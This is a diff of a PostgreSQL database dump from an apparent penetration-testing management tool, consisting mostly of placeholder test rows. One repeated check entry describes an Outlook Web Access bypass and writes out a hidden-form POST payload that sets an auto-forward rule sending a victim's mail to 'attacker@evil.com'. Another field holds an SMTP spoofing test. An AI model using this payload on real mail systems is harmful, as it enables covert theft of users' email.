@@ -4,7 +4,7 @@
 
 -- Dumped from database version 8.4.13
 -- Dumped by pg_dump version 9.1.3
--- Started on 2012-12-02 02:20:34 MSK
+-- Started on 2013-01-20 18:00:07 MSK
 
 SET statement_timeout = 0;
 SET client_encoding = 'UTF8';
@@ -112,7 +112,7 @@ ALTER TABLE public.check_categories OWNER TO gtta;
 
 --
 -- TOC entry 141 (class 1259 OID 21611)
--- Dependencies: 140 6
+-- Dependencies: 6 140
 -- Name: check_categories_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -176,7 +176,7 @@ ALTER TABLE public.check_controls OWNER TO gtta;
 
 --
 -- TOC entry 144 (class 1259 OID 21625)
--- Dependencies: 6 143
+-- Dependencies: 143 6
 -- Name: check_controls_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -205,7 +205,7 @@ ALTER SEQUENCE check_controls_id_seq OWNED BY check_controls.id;
 -- Name: check_controls_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('check_controls_id_seq', 12, true);
+SELECT pg_catalog.setval('check_controls_id_seq', 17, true);
 
 
 --
@@ -311,7 +311,7 @@ ALTER TABLE public.check_results OWNER TO gtta;
 
 --
 -- TOC entry 150 (class 1259 OID 21655)
--- Dependencies: 6 149
+-- Dependencies: 149 6
 -- Name: check_results_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -485,7 +485,7 @@ ALTER SEQUENCE checks_id_seq OWNED BY checks.id;
 -- Name: checks_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('checks_id_seq', 48, true);
+SELECT pg_catalog.setval('checks_id_seq', 49, true);
 
 
 --
@@ -535,7 +535,7 @@ ALTER TABLE public.clients OWNER TO gtta;
 
 --
 -- TOC entry 159 (class 1259 OID 21699)
--- Dependencies: 158 6
+-- Dependencies: 6 158
 -- Name: clients_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -716,7 +716,7 @@ ALTER SEQUENCE project_details_id_seq OWNED BY project_details.id;
 -- Name: project_details_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('project_details_id_seq', 3, true);
+SELECT pg_catalog.setval('project_details_id_seq', 4, true);
 
 
 --
@@ -736,7 +736,7 @@ ALTER TABLE public.project_users OWNER TO gtta;
 
 --
 -- TOC entry 166 (class 1259 OID 21727)
--- Dependencies: 2034 6 502
+-- Dependencies: 2034 502 6
 -- Name: projects; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -755,7 +755,7 @@ ALTER TABLE public.projects OWNER TO gtta;
 
 --
 -- TOC entry 167 (class 1259 OID 21734)
--- Dependencies: 6 166
+-- Dependencies: 166 6
 -- Name: projects_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -856,7 +856,7 @@ ALTER TABLE public.report_template_sections OWNER TO gtta;
 
 --
 -- TOC entry 198 (class 1259 OID 28053)
--- Dependencies: 6 199
+-- Dependencies: 199 6
 -- Name: report_template_sections_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -885,7 +885,7 @@ ALTER SEQUENCE report_template_sections_id_seq OWNED BY report_template_sections
 -- Name: report_template_sections_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('report_template_sections_id_seq', 3, true);
+SELECT pg_catalog.setval('report_template_sections_id_seq', 4, true);
 
 
 --
@@ -1002,7 +1002,7 @@ ALTER TABLE public.report_templates OWNER TO gtta;
 
 --
 -- TOC entry 192 (class 1259 OID 27304)
--- Dependencies: 6 193
+-- Dependencies: 193 6
 -- Name: report_templates_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1078,7 +1078,7 @@ ALTER TABLE public.risk_categories OWNER TO gtta;
 
 --
 -- TOC entry 182 (class 1259 OID 22071)
--- Dependencies: 6 183
+-- Dependencies: 183 6
 -- Name: risk_categories_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1186,7 +1186,7 @@ ALTER SEQUENCE risk_templates_id_seq OWNED BY risk_templates.id;
 -- Name: risk_templates_id_seq; Type: SEQUENCE SET; Schema: public; Owner: gtta
 --
 
-SELECT pg_catalog.setval('risk_templates_id_seq', 5, true);
+SELECT pg_catalog.setval('risk_templates_id_seq', 6, true);
 
 
 --
@@ -1235,7 +1235,7 @@ ALTER TABLE public.system OWNER TO gtta;
 
 --
 -- TOC entry 171 (class 1259 OID 21747)
--- Dependencies: 6 170
+-- Dependencies: 170 6
 -- Name: system_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1357,7 +1357,7 @@ ALTER TABLE public.target_check_vulns OWNER TO gtta;
 
 --
 -- TOC entry 176 (class 1259 OID 21773)
--- Dependencies: 2045 496 6 499
+-- Dependencies: 2045 499 496 6
 -- Name: target_checks; Type: TABLE; Schema: public; Owner: gtta; Tablespace: 
 --
 
@@ -1413,7 +1413,7 @@ ALTER TABLE public.targets OWNER TO gtta;
 
 --
 -- TOC entry 179 (class 1259 OID 21789)
--- Dependencies: 6 178
+-- Dependencies: 178 6
 -- Name: targets_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1457,7 +1457,9 @@ CREATE TABLE users (
     password character varying(1000) NOT NULL,
     name character varying(1000),
     client_id bigint,
-    role user_role DEFAULT 'admin'::user_role NOT NULL
+    role user_role DEFAULT 'admin'::user_role NOT NULL,
+    last_action_time timestamp without time zone,
+    login_time timestamp without time zone
 );
 
 
@@ -1465,7 +1467,7 @@ ALTER TABLE public.users OWNER TO gtta;
 
 --
 -- TOC entry 181 (class 1259 OID 21798)
--- Dependencies: 6 180
+-- Dependencies: 180 6
 -- Name: users_id_seq; Type: SEQUENCE; Schema: public; Owner: gtta
 --
 
@@ -1616,7 +1618,7 @@ ALTER TABLE ONLY report_template_sections ALTER COLUMN id SET DEFAULT nextval('r
 
 --
 -- TOC entry 2056 (class 2604 OID 27339)
--- Dependencies: 195 196 196
+-- Dependencies: 196 195 196
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
 
@@ -1634,7 +1636,7 @@ ALTER TABLE ONLY report_templates ALTER COLUMN id SET DEFAULT nextval('report_te
 
 --
 -- TOC entry 2049 (class 2604 OID 22076)
--- Dependencies: 183 182 183
+-- Dependencies: 182 183 183
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
 
@@ -1746,6 +1748,11 @@ COPY check_controls (id, check_category_id, name) FROM stdin;
 10	9	SESSION HANDLING & COOKIES
 1	1	Default
 12	11	New checks
+13	1	1
+14	1	2
+15	1	3
+16	1	4
+17	1	5
 \.
 
 
@@ -1780,6 +1787,16 @@ COPY check_controls_l10n (check_control_id, language_id, name) FROM stdin;
 1	2	zzz
 12	1	New checks
 12	2	\N
+13	1	1
+13	2	\N
+14	1	2
+14	2	\N
+15	1	3
+15	2	\N
+16	1	4
+16	2	\N
+17	1	5
+17	2	\N
 \.
 
 
@@ -2026,7 +2043,8 @@ COPY checks (id, check_control_id, name, background_info, hints, advanced, autom
 1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.		f	t	dns_a.py	f		\N		1			2
 47	12	CMS check			f	t	cms_detection.py	f	http	80		1			2
 48	10	yay			f	f		f		\N		1			2
-46	10	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	f	t	w3af_form_autocomplete.py	f		\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	1			2
+49	13	hh			f	f		f		\N		1			2
+46	10	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	f	t	w3af_form_autocomplete.py	t		\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	1			2
 \.
 
 
@@ -2122,11 +2140,13 @@ COPY checks_l10n (check_id, language_id, name, background_info, hints, reference
 1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
 1	2	ZZZ	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
 46	2	\N	\N	\N	\N	\N
-46	1	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>
 47	1	CMS check	\N	\N	\N	\N
 47	2	\N	\N	\N	\N	\N
 48	1	yay	\N	\N	\N	\N
 48	2	\N	\N	\N	\N	\N
+49	1	hh	\N	\N	\N	\N
+49	2	\N	\N	\N	\N	\N
+46	1	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><ul><li>inherited</li><li>list</li></ul><li>tres</li></ul><br><ol><li>eins</li><li>zwei</li><li>drei</li><ol><li>vier</li></ol><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	\N	<span><span>HELO MYDOMAIN<br>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;<br>\r\nRCPT TO :&lt;InternalName2@domain.ch&gt;<br>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br>\r\nFROM: InternalName1<br>\r\nTO: InternalName2<br>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>
 \.
 
 
@@ -2175,6 +2195,7 @@ COPY languages (id, name, code, "default") FROM stdin;
 COPY project_details (id, project_id, subject, content) FROM stdin;
 2	1	hello	world
 3	2	kekek	kkk\r\n
+4	1	yaya	aazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzz
 \.
 
 
@@ -2230,7 +2251,8 @@ COPY "references" (id, name, url) FROM stdin;
 --
 
 COPY report_template_sections (id, report_template_id, check_category_id, intro, sort_order, title) FROM stdin;
-1	1	9	Project admin:&nbsp;{admin}	0	Hey
+1	1	9	Project admin:&nbsp;{admin} hey	0	Hey
+4	1	1	key key	1	Key
 \.
 
 
@@ -2241,8 +2263,10 @@ COPY report_template_sections (id, report_template_id, check_category_id, intro,
 --
 
 COPY report_template_sections_l10n (report_template_section_id, language_id, intro, title) FROM stdin;
-1	1	Project admin:&nbsp;{admin}	Hey
+1	1	Project admin:&nbsp;{admin} hey	Hey
 1	2	Project admin:&nbsp;{admin}	kkkkk
+4	1	key key	Key
+4	2	\N	\N
 \.
 
 
@@ -2305,10 +2329,6 @@ COPY report_templates_l10n (report_template_id, language_id, name, intro, append
 --
 
 COPY risk_categories (id, name, risk_template_id) FROM stdin;
-16	Fluger geheimer	3
-17	Cat 1	4
-18	cat 2	4
-19	ZZZz	3
 \.
 
 
@@ -2319,14 +2339,6 @@ COPY risk_categories (id, name, risk_template_id) FROM stdin;
 --
 
 COPY risk_categories_l10n (risk_category_id, language_id, name) FROM stdin;
-16	1	Fluger geheimer
-16	2	Eins zwei
-17	1	Cat 1
-17	2	\N
-18	1	cat 2
-18	2	\N
-19	1	ZZZz
-19	2	AAAA
 \.
 
 
@@ -2337,175 +2349,6 @@ COPY risk_categories_l10n (risk_category_id, language_id, name) FROM stdin;
 --
 
 COPY risk_category_checks (risk_category_id, check_id, damage, likelihood) FROM stdin;
-16	3	1	1
-16	45	1	1
-16	6	1	1
-16	7	1	1
-16	9	1	1
-16	10	1	1
-16	12	1	1
-16	13	1	1
-16	15	1	1
-16	16	1	1
-16	8	1	1
-16	11	1	1
-16	14	1	1
-16	1	1	1
-16	5	1	1
-16	17	1	1
-16	18	1	1
-16	19	1	1
-16	20	1	1
-16	21	1	1
-16	22	1	1
-16	23	1	1
-16	24	1	1
-16	25	1	1
-16	26	1	1
-16	27	1	1
-16	28	1	1
-16	29	1	1
-16	30	1	1
-16	31	1	1
-16	32	1	1
